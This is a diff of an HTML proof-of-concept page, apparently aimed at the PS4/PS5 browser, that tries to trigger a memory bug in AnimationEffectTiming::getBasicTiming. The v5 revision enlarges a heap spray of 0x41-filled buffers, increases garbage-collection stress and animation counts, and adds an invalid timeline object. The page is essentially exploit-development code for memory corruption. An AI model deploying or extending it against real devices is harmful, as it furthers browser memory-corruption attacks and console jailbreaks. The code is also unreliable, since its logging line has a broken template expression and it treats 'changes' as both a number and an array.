@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AnimationEffectTiming ASAN PoC v4 (PS4/PS5?)</title>
+    <title>AnimationEffectTiming ASAN PoC v5 (PS4/PS5?)</title>
     <style>
         #trigger {
             margin: 20px 0;
@@ -33,7 +33,7 @@
     </style>
 </head>
 <body>
-    <h1>AnimationEffectTiming ASAN PoC v4</h1>
+    <h1>AnimationEffectTiming ASAN PoC v5</h1>
     <p>Click to test ASAN issue in AnimationEffectTiming::getBasicTiming.</p>
     <button id="trigger">TEST ANIMATION</button>
     <div id="status">Idle...</div>
@@ -50,10 +50,10 @@
         }
 
         function stressGC() {
-            for (let i = 0; i < 1000; i++) {
+            for (let i = 0; i < 2000; i++) {
                 new ArrayBuffer(1024 * 1024);
             }
-            for (let i = 0; i < 200; i++) {
+            for (let i = 0; i < 300; i++) {
                 new ArrayBuffer(2 * 1024 * 1024);
             }
         }
@@ -93,7 +93,7 @@
 
                 // Heap spray
                 const spray = [];
-                for (let i = 0; i < 1000; i++) {
+                for (let i = 0; i < 2000; i++) {
                     const buf = new Uint8Array(1024 * 1024);
                     buf.fill(0x41);
                     spray.push(buf);
@@ -103,7 +103,7 @@
                 const target = document.getElementById('target');
                 const keyframes = { transform: ['translateX(0)', 'translateX(100px)'] };
                 const animations = [];
-                for (let i = 0; i < 20; i++) {
+                for (let i = 0; i < 50; i++) {
                     const effect = new KeyframeEffect(target, keyframes, { duration: 1000 });
                     animations.push(new Animation(effect, document.timeline));
                 }
@@ -113,6 +113,13 @@
                     animations.push(new Animation(invalidEffect, document.timeline));
                 } catch (e) {
                     log(`Invalid effect error: ${e.message}`);
+                }
+                // Add invalid timeline
+                try {
+                    const invalidTimeline = { currentTime: undefined };
+                    animations.push(new Animation(new KeyframeEffect(target, keyframes, { duration: 1000 }), invalidTimeline));
+                } catch (e) {
+                    log(`Invalid timeline error: ${e.message}`);
                 }
 
                 // Trigger animations
@@ -127,18 +134,21 @@
                         });
                         target.replaceChildren('test');
                         stressGC();
-                        // Check memory changes during loop
-                        const result = check();
-                        if (result.changes > 0) {
-                            clearInterval(interval);
-                            status.textContent = `Issue detected at iteration ${iteration}! ${result.changes} bytes changed`;
-                            log(`Issue detected at iteration ${iteration}! ${result.changes} bytes changed`);
-                            log(`Changes: ${result.changes.map(([k, v]) => ${k} (${v} bytes)).join(', ')}`);
+                        // Check memory changes every 10 iterations
+                        if (iteration % 10 === 0) {
+                            const result = check();
+                            if (result.changes > 0) {
+                                clearInterval(interval);
+                                status.textContent = `Issue detected at iteration ${iteration}! ${result.changes} bytes changed`;
+                                log(`Issue detected at iteration ${iteration}! ${result.changes} bytes changed`);
+                                log(`Changes: ${result.changes.map(([k, v]) => ${k} (${v} bytes)).join(', ')}`);
+                            }
                         }
                     } catch (e) {
-                        log(`Error in animation at iteration ${iteration}: ${e.message}`);
+                        log(`Error in animation at iteration ${iteration}: ${e.message} - Stack: ${e.stack}`);
+                        clearInterval(interval);
                     }
-                }, 2);
+                }, 5);
 
                 // Final check
                 setTimeout(() => {
@@ -168,7 +178,7 @@
                             }
                         }, 10);
                     }
-                }, 5000);
+                }, 10000);
             } catch (err) {
                 status.textContent = `Failed: ${err.message}`;
                 log(`Error: ${err.message}`);
